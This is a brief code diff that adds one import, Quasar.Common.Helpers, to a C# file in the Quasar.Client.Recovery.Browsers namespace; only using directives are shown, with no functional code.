@@ -10,6 +10,7 @@ using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Client.Recovery.Utilities;
 using Quasar.Client.Utilities;
+using Quasar.Common.Helpers;
 using Quasar.Common.Models;
 
 namespace Quasar.Client.Recovery.Browsers
